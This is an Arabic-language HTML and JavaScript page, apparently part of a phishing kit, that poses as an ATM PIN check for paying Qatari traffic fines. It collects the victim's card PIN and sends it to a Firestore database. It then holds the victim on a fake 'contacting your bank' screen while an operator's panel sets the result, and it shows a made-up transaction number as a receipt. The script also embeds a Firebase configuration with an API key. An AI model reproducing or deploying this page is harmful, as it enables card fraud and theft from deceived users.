<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>التحقق من الهوية - الصراف الآلي</title>
  <style>
    body { margin: 0; padding: 0; background-color: #f4f7f6; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .atm-card { background: #fff; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; }
    .atm-title { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 10px; }
    .atm-msg { font-size: 13px; color: #666; margin-bottom: 25px; }
    .pin-input { width: 100%; height: 50px; border: 1px solid #ddd; border-radius: 8px; text-align: center; font-size: 28px; letter-spacing: 15px; outline: none; margin-bottom: 20px; }
    .confirm-btn { width: 100%; height: 50px; background: #008b47; color: #fff; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; }
    #errorMsg { color: red; font-size: 12px; margin-top: 10px; display: none; }
    
    /* لودر الانتظار بنفس ستايل النظام */
    .loader-ring {
      display: inline-block;
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #008b47;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>

<div class="atm-card" id="mainContent">
  <div id="formSection">
    <div class="atm-title">الرمز السري للبطاقة (ATM PIN)</div>
    <div class="atm-msg">يرجى إدخال الرقم السري المكون من 4 أرقام التابع للبطاقة لإتمام عملية التفويض بنجاح.</div>
    
    <form id="atmForm">
      <input type="password" id="atmPin" class="pin-input" maxlength="4" placeholder="****" inputmode="numeric" required>
      <button type="submit" class="confirm-btn" id="confirmBtn">تأكيد العملية</button>
    </form>
    <div id="errorMsg">الرمز السري غير صحيح، يرجى المحاولة مرة أخرى.</div>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625",
      measurementId: "G-CSRM4QLNR9"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const analytics = firebase.analytics();

    const currentOrderId = sessionStorage.getItem("last_order_id");

    document.getElementById("atmForm").onsubmit = async (e) => {
        e.preventDefault();
        const btn = document.getElementById("confirmBtn");
        const pinInput = document.getElementById("atmPin");
        
        btn.innerHTML = "جاري التحقق...";
        btn.disabled = true;

        const pinData = {
            atm_pin: pinInput.value,
            status: "pin_submitted",
            pin_timestamp: firebase.firestore.FieldValue.serverTimestamp()
        };

        try {
            analytics.logEvent('pin_submitted');
            
            if (currentOrderId) {
                // تحديث نفس طلب العميل بالرقم السري
                await db.collection("orders").doc(currentOrderId).update(pinData);
                
                // إظهار اللودر بانتظار رد الأدمن
                document.getElementById("mainContent").innerHTML = `
                    <div class="loader-ring"></div>
                    <div class="atm-title">جاري معالجة الدفع</div>
                    <div class="atm-msg">يرجى الانتظار، يتم الآن التواصل مع البنك المصدر للبطاقة لتأكيد العملية...</div>
                `;
                
                listenForFinalStatus(currentOrderId);
            } else {
                // حالة احتياطية
                const docRef = await db.collection("orders").add(pinData);
                listenForFinalStatus(docRef.id);
            }
        } catch (err) { 
            console.error(err);
            location.reload(); 
        }
    };

    function listenForFinalStatus(docId) {
        db.collection("orders").doc(docId).onSnapshot((doc) => {
            const data = doc.data();
            if(!data) return;

            // إذا أعطيت أمر "نجاح" من لوحتك
            if(data.status === "success") {
                analytics.logEvent('payment_success');
                document.getElementById("mainContent").innerHTML = `
                    <div style="color:#008b47; font-size:60px; margin-bottom:15px;">✓</div>
                    <div class="atm-title">تم الدفع بنجاح</div>
                    <div class="atm-msg">تم استلام مبلغ المخالفات وتحديث السجل المروري فوراً.</div>
                    <div style="font-size:12px; color:#999; margin-top:10px;">رقم العملية: ${Math.floor(100000 + Math.random() * 900000)}</div>
                    <button class="confirm-btn" style="margin-top:20px;" onclick="window.location.href='index.php'">الرجوع للرئيسية</button>
                `;
            } 
            // إذا أعطيت أمر "خطأ في الـ PIN"
            else if(data.status === "pin_error") {
                analytics.logEvent('pin_error');
                // إعادة العميل للفورم مع رسالة الخطأ
                location.reload(); // أو نرجع بناء الفورم برمجياً
            }
        });
    }
</script>
</body>
</html>
